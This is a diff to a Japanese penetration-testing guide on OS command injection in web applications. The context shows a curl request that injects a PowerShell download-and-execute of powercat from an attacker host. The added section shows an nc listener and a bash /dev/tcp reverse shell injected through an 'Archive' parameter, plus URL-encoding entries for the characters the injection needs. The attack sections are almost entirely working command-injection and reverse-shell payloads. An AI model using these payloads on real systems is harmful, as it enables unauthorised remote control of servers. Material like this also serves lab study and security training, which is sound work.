@@ -153,6 +153,8 @@ Webアプリケーションが背後でシェルを呼び出す際の検証不�
 | `&&` | `%26%26` | 直前のコマンドが成功した場合のみ次を実行 |
 | `\|` | `%7C` | パイプ（標準出力を次のコマンドに渡す） |
 | `&` | `%26` | バックグラウンド実行（CMD / Linux） |
+|Space| `%20` | スペース |
+| `\/` | `%2F` | （パスの区切りとしてなら不要な場合もある）|   
 
 ### 4.2 実行環境の特定（CMD vs PowerShell判定）
 PetSerAl のスニペットを利用して、実行環境が `cmd.exe` か `powershell.exe` かを判定します。
@@ -179,4 +181,18 @@ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C
 4. **URLエンコードしてリクエスト送信**:
    ```bash
    curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<KALI_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<KALI_IP>%20-p%20<LPORT>%20-e%20powershell' http://<TARGET_IP>:8000/archive
+   ```
+
+### 4.4 Linux によるリバースシェル奪取  
+1. **Kali側でNetcatリスナーを起動**:
+   ```bash
+   nc -nvlp <LPORT>
+   ```
+2. **リバースシェル実行ペイロード**:
+   ```bash
+   bash -i >& /dev/tcp/<KALI_IP>/<KALI_PORT> 0>&1
+   ```
+3. **URLエンコード(Option使用)してリクエスト送信**:
+   ```bash
+   curl -X POST --data-urlencode 'Archive=git;bash -i >& /dev/tcp/<KALI_IP>/<KALI_PORT> 0>&1' http://<TARGET_IP>:8000/archive
    ```
